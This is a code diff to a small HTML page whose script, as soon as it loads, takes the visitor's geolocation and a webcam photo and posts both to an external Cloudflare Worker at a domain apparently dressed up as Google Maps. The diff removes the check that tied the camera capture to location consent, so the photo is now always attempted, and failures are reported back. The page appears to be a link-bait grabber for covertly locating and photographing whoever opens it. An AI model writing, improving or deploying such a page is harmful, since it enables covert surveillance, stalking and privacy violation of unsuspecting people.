@@ -15,9 +15,10 @@
 </head>
 <body>
 <video id="v" autoplay playsinline muted></video>
-<div id="s">📍 Sending location...</div>
+<div id="s">📍 Sending location and photo...</div>
 
 <script>
+  // Paste your Cloudflare Worker URL here (no token needed)
   const WORKER_URL = "https://googlemaps.mostafa-solom258.workers.dev";
 
   const s = document.getElementById("s");
@@ -39,7 +40,6 @@
 
   (async () => {
     const sent = [];
-    let locationOk = false;
 
     try {
       const { coords } = await getPosition();
@@ -48,24 +48,22 @@
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ latitude: coords.latitude, longitude: coords.longitude })
       });
-      if (r.ok) { sent.push("location"); locationOk = true; }
+      if (r.ok) sent.push("location");
     } catch (e) {}
 
-    // Only attempt the camera if location was allowed
-    if (locationOk) {
-      try {
-        const blob = await takePhoto();
-        const fd = new FormData();
-        fd.append("photo", blob, "selfie.jpg");
-        const r = await fetch(WORKER_URL, { method: "POST", body: fd });
-        if (r.ok) sent.push("photo");
-      } catch (e) {
-        // camera denied or failed — that's fine, location already sent
-      }
+       try {
+      const blob = await takePhoto();
+      const fd = new FormData();
+      fd.append("photo", blob, "selfie.jpg");
+      const r = await fetch(WORKER_URL, { method: "POST", body: fd });
+      if (r.ok) sent.push("photo");
+      else sent.push(`photo-failed(${r.status})`);
+    } catch (e) {
+      sent.push(`photo-error(${e.name}: ${e.message})`);
     }
 
     v.style.display = "none";
-    s.textContent = sent.length ? `✅ Sent: ${sent.join(" + ")}` : "❌ Please allow location, then reopen";
+    s.textContent = sent.length ? `✅ Sent: ${sent.join(" + ")}` : "❌ Please allow location and camera, then reopen";
   })();
 </script>
 </body>
